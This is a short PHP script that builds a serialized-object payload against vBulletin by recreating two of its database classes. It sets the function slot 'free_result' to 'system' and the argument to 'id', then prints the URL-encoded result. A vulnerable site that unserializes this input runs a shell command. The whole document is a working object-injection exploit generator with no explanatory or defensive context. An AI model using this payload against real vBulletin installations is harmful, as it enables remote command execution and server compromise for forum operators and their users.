<?php

class vB_Database_MySQLi
{
    var $functions = array();
    public function __construct($functions = '')
    {
        $this->functions['free_result'] = $functions;
    }
}

class vB_dB_Result
{
    protected $db = false;
    protected $recordset = false;
    public function __construct($db='', $recordset='')
    {
        $this->db = $db;
        $this->recordset = $recordset;
    }
}

$vb_database_mysqli = new vB_Database_MySQLi('system');
$vb_db_result = new vB_dB_Result($vb_database_mysqli, 'id');
echo urlencode(serialize($vb_db_result));